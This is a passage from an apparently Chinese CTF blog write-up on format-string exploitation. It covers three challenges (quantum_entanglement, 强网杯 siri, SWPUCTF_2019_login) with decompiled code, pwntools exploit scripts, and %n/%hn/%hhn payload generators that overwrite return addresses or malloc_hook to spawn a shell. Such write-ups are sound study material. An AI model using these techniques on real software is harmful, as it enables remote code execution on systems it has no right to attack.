[esp+E4h] [ebp-8h]</span>  v12 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>  v11 <span class="token operator">=</span> <span class="token function">__readgsdword</span><span class="token punctuation">(</span><span class="token number">0x14u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/random"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token function">perror</span><span class="token punctuation">(</span><span class="token string">"/dev/urandom"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span>buf <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xCAFEBABE</span><span class="token punctuation">;</span>  <span class="token operator">*</span>addr <span class="token operator">&amp;</span><span class="token operator">=</span> <span class="token number">0xBADBADu</span><span class="token punctuation">;</span>  <span class="token function">mprotect</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">mprotect</span><span class="token punctuation">(</span>addr<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token operator">*</span>addr<span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"FirstName: "</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">0xAu</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%13s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"LastName: "</span><span class="token punctuation">,</span> <span class="token number">1u</span><span class="token punctuation">,</span> <span class="token number">9u</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token string">"%13s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">log_in</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>format<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/*  int __cdecl log_in(char *format, char *a2)  {      fwrite("Welcome my Dear ", 1u, 0x10u, stdout);      fprintf(stdout, format, "%s");      fprintf(stdout, a2, "%s");      return 0;  }  */</span>  <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">3u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">!=</span> v4 <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>程序逻辑就是mmap出两块4字节的内存，然后分别往里面读入4字节的随机数，然后将两个随机数分别与上<code>0xCAFEBABE</code>和<code>0xBADBAD</code>，接着再接收两次13字节的输入，作为参数传入log_in函数，log_in函数之后对v8和v4进行比较，如果相等则执行system(“/bin/sh”)</p><p>在fprintf函数中存在格式化字符串漏洞</p><p>这里需要用到一个新的知识点</p><p><code>%*X$c%Y$n</code>会把栈中偏移X处的值赋给栈中偏移Y处的指针指向的地址</p><p>在执行fprintf的时候站空间如下</p><p><a href="https://imgchr.com/i/BHioBd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BHioBd.png" alt="BHioBd.png"></a></p><p>在0055的栈空间出残留着第一个随机数地址的后四位，0050的栈空间是第二个随机数，它们的相对偏移如下</p><p><a href="https://imgchr.com/i/BHkmz8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BHkmz8.png" alt="BHkmz8.png"></a></p><p>但是因为在fprintf函数中，格式化字符串并不是第一个参数，是第二个，和printf函数有所不同，所以这里fprintf函数格式化字符串的偏移都需要-1</p><p>这题的思路依然是在栈中找栈链，然后将栈链中的一条链的后四位修改成第一个随机数地址的后四位，然后再修改第一个随机数的值为第二个随机数，找到如下这条链</p><p><a href="https://imgchr.com/i/BHAnt1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BHAnt1.png" alt="BHAnt1.png"></a></p><p>exp如下</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./quantum_entanglement'</span><span class="token punctuation">)</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./quantum_entanglement'</span><span class="token punctuation">)</span>payload1<span class="token operator">=</span><span class="token string">'%*19$c%44$hn'</span> <span class="token comment" spellcheck="true">#将%44位置处的栈链修改到指向第一个随机数</span>payload2<span class="token operator">=</span><span class="token string">'%*18$c%118$n'</span> <span class="token comment" spellcheck="true">#一次性将第二个随机数写入到第一个随机数的地址</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'FirstName:'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>修改栈链后栈空间如下</p><p><a href="https://imgchr.com/i/BHVuQK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/09/BHVuQK.png" alt="BHVuQK.png"></a></p><p>考察这个知识点的题目还有ciscn2020华南分赛区same和MidnightsunCTF Quals 2020 pwn4，就不多说了</p><p>再氵两道题吧，首先是一道强网杯的Siri</p><h2 id="0x5-强网杯-siri"><a href="#0x5-强网杯-siri" class="headerlink" title="0x5.强网杯 siri"></a>0x5.强网杯 siri</h2><p>检查保护</p><p><a href="https://imgchr.com/i/BLZPMt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLZPMt.png" alt="BLZPMt.png"></a></p><p>IDA分析</p><p><a href="https://imgchr.com/i/BLVvIe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLVvIe.png" alt="BLVvIe.png"></a></p><p>再sub_1212函数中存在格式化字符串漏洞</p><p><a href="https://imgchr.com/i/BLZMMq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLZMMq.png" alt="BLZMMq.png"></a></p><p>这题和上面的题目比起来很简单了，主要是讲一下构造payload</p><p>格式化字符串在栈上，直接改返回地址或者malloc_hook为onegadget就行</p><p>首先泄露libc和stack地址</p><p><a href="https://imgchr.com/i/BLMtJO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLMtJO.png" alt="BLMtJO.png"></a></p><p>泄露这两个地方的值得到栈地址和libc地址，函数的返回地址为rbp下方的那个值，所以返回地址为泄露的栈地址-0x118</p><p>我们输入的值在这个地方</p><p><a href="https://imgchr.com/i/BLMRSg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLMRSg.png" alt="BLMRSg.png"></a></p><p>得到对应的偏移为%49</p><p>首先来试第一种方法，修改返回地址</p><p>根据格式化字符串修改内存的用法：%Xc%Y$hn(hhn)，其中X为要写入的字节数，Y为偏移量。在64位格式化字符串漏洞利用中，要写入的地址一般都是放在最后面，所以Y要根据要写入地址的偏移量来设置。而写字节一次性可以写4字节，2字节和1字节，一般选用一次写入2字节和1字节的，一次写入4字节的话要返回值太多，本地可以勉强接受，远程肯定会崩掉。</p><p>先来讲下一次性写入两字节的payload的是如何构造的。首先返回地址为6字节长，因为onegadget和返回地址的值所有字节都不相同，所以需要全部修改，-一次改2字节共需要修改3次，这样就有8*3=0x18字节的长度，三个返回地址一次放在payload的最后面。printf函数除了用户输入的数据还会在前面输出<code>&gt;&gt;&gt; OK, I'll remind you to</code> ，长度为27，所以在构造pyload的过程中需要减27，还有用户输入的数据是和<code>Remind me to</code> 拼接在一起的，长度为13，最后payload对齐的时候需要-13再对齐。payload构造如下：</p><pre class=" language-python"><code class="language-python">write_size<span class="token operator">=</span><span class="token number">0</span>offset<span class="token operator">=</span><span class="token number">55</span> <span class="token comment" spellcheck="true">#offset根据payload对齐的字节来决定</span>payload<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#一共三次，每次修改两字节</span>  num<span class="token operator">=</span><span class="token punctuation">(</span>onegadget<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token comment" spellcheck="true">#每次将onegadget右移两字节</span>  num<span class="token operator">-=</span><span class="token number">27</span><span class="token comment" spellcheck="true">#>>> OK, I'll remind you to 的长度为27</span>  <span class="token keyword">if</span> num<span class="token operator">></span>write_size<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#如果这一次要写入的字节数大于已经写入的字节数，只需要写入num和write_size之差的字节数即可，因为</span>    payload<span class="token operator">+=</span><span class="token string">'%{}c%{}$hn'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#前面已经写入了write_size个字节，再加上差值就能</span>    write_size<span class="token operator">+=</span>num<span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span>                            <span class="token comment" spellcheck="true">#写入num个字节了</span>  <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#如果本次要写入的字节数小于已经写入的字节数，那么我们是不能直接写入num个字节的，可以理解为溢出了，比如已经写入了0xffff个字节，而本次要写入0xeeee个字节，”超额“写入了，这个时候就需要写入负数，四字节的最大值为0xffff，可以理解为0x10000为0，0-0xffff得到一个负数-0xffff，然后再加上0xeeee得到差值-0x1111。</span>    payload<span class="token operator">+=</span><span class="token string">'%{}c%{}$hn'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x10000</span><span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>num<span class="token punctuation">,</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>    write_size<span class="token operator">+=</span><span class="token number">0x10000</span><span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span>numpayload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#八字节对齐</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rip<span class="token operator">+</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将存储着返回地址的栈地址放到payload的最末尾，每次加2</span></code></pre><p>生成好的payload在printf栈中</p><p><a href="https://imgchr.com/i/BLvSN6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLvSN6.png" alt="BLvSN6.png"></a></p><p>printf函数执行后</p><p><a href="https://imgchr.com/i/BLv3uj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLv3uj.png" alt="BLv3uj.png"></a></p><p>返回地址已经被修改</p><p>再来看看一次修改一字节的payload生成，实际上就是把0x10000改成0x100，$hn改成$hhn，payload对齐字节要更多以及偏移量要变化</p><pre class=" language-python"><code class="language-python">write_size<span class="token operator">=</span><span class="token number">0</span>offset<span class="token operator">=</span><span class="token number">60</span>payload<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  num<span class="token operator">=</span><span class="token punctuation">(</span>onegadget<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>  num<span class="token operator">-=</span><span class="token number">27</span>  <span class="token keyword">if</span> num<span class="token operator">></span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">:</span>    payload<span class="token operator">+=</span><span class="token string">'%{}c%{}$hhn'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>    write_size<span class="token operator">+=</span>num<span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    payload<span class="token operator">+=</span><span class="token string">'%{}c%{}$hhn'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>num<span class="token punctuation">,</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>    write_size<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>numpayload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rip<span class="token operator">+</span>i<span class="token punctuation">)</span></code></pre><p>此时的payload在栈空间中</p><p><a href="https://imgchr.com/i/BLzKXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLzKXQ.png" alt="BLzKXQ.png"></a></p><p>修改完后</p><p><a href="https://imgchr.com/i/BLzJhV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/10/BLzJhV.png" alt="BLzJhV.png"></a></p><p>改malloc_hook和改返回地址是一样的，只需要把最后的地址换成malloc_hook的地址就行</p><p>还有一种方法就是修改main函数的返回地址</p><p><a href="https://imgchr.com/i/BXCG0e" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BXCG0e.png" alt="BXCG0e.png"></a></p><p>但因为main函数在while死循环里，所以我们还需要使main函数跳出循环</p><p>在IDA的graph view界面里我们可以看到代码块都走向了同一处</p><p><a href="https://imgchr.com/i/BXC2hn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BXC2hn.png" alt="BXC2hn.png"></a></p><p>然后又会回到main函数开头，所以我们需要利用格式化字符串修改程序不跳转到这里，而是直接结束main函数</p><p>在执行完格式化字符串所在的函数后，执行的下一条指令如下</p><p><a href="https://imgchr.com/i/BXPWUH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BXPWUH.png" alt="BXPWUH.png"></a></p><p>在栈中是返回地址</p><p><a href="https://imgchr.com/i/BXP4PA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BXP4PA.png" alt="BXP4PA.png"></a></p><p>我们将返回地址的最后两位修改为leave ret的后两位，使其跳转到leave ret</p><p><img src="/LawlietLW.github.io/2020/11/03/qi-xing-ji-hua-1/C:%5CUsers%5C24990%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201111084714797.png" alt="image-20201111084714797"></p><p>所以一共分两步，第一步修改main函数返回地址为onegadget，第二步修改printf函数返回地址为leave ret</p><pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  num<span class="token operator">=</span><span class="token punctuation">(</span>onegadget<span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span>  num<span class="token operator">-=</span><span class="token number">27</span>  <span class="token keyword">if</span> num<span class="token operator">></span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">:</span>    payload<span class="token operator">+=</span><span class="token string">'%{0}c%{1}$hhn'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>    write_size<span class="token operator">+=</span>num<span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    payload<span class="token operator">+=</span><span class="token string">'%{0}c%{1}$hhn'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>num<span class="token punctuation">,</span>offset<span class="token operator">+</span>i<span class="token punctuation">)</span>    write_size<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token operator">-</span><span class="token punctuation">(</span>write_size<span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>numpayload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>main_ret<span class="token operator">+</span>i<span class="token punctuation">)</span>siri<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>siri<span class="token punctuation">(</span><span class="token string">'aaaa'</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token number">0xc1</span><span class="token operator">-</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%61$hhn'</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x5f</span><span class="token operator">-</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>siri<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></code></pre><p><a href="https://imgchr.com/i/BX4JSI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BX4JSI.png" alt="BX4JSI.png"></a></p><p>第一次printf后main函数返回地址已经修改为了onegadget</p><p><a href="https://imgchr.com/i/BX4NOf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BX4NOf.png" alt="BX4NOf.png"></a></p><p>第二次printf后pintf函数返回地址被修改成功</p><p><a href="https://imgchr.com/i/BX4RmT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BX4RmT.png" alt="BX4RmT.png"></a></p><p>直接返回执行onegadget</p><h2 id="0x6-SWPUCTF-2019-login"><a href="#0x6-SWPUCTF-2019-login" class="headerlink" title="0x6.SWPUCTF_2019_login"></a>0x6.SWPUCTF_2019_login</h2><p>检查保护</p><p><a href="https://imgchr.com/i/BX7Gs1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BX7Gs1.png" alt="BX7Gs1.png"></a></p><p>got表可改</p><p>IDA分析</p><p><a href="https://imgchr.com/i/BX7diD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BX7diD.png" alt="BX7diD.png"></a></p><p>存在格式化字符串漏洞，不过格式化字符串在bss段上，最多能输入0x32个字节</p><p>因为输入wllmmllw能够退出程序，所以考虑修改main函数的返回地址为onegadget</p><p><a href="https://imgchr.com/i/Bjj5iq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/Bjj5iq.png" alt="Bjj5iq.png"></a></p><p>通过%6$p和%15$p泄露栈地址和libc地址</p><p>然后修改005c处的栈链指向main函数的返回地址，也就是0050处</p><p>修改之前</p><p><a href="https://imgchr.com/i/BvSR10" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvSR10.png" alt="BvSR10.png"></a></p><p>修改之后</p><p><a href="https://imgchr.com/i/BvS4nU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvS4nU.png" alt="BvS4nU.png"></a></p><p>然后就可以修改mian函数的返回地址了，onegadget和返回地址有三个字节不同，所以需要先修改两字节，然后再将栈链+2，继续修改剩下的一字节</p><p>exp如下：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./SWPUCTF_2019_login"</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27_x86.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"name: "</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%6$p-%15$p'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"password: "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>ret_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">36</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">241</span>onegadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x3d0e0</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'ret_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'onegadget => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>onegadget<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ret_addr<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%22$hn'</span><span class="token comment" spellcheck="true">#gdb.attach(io)</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Try again!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>onegadget<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c%59$hn'</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Try again!\n"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token string">'%'</span><span class="token operator">+</span>str<span class="token punctuation">(</span><span class="token punctuation">(</span>ret_addr<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token 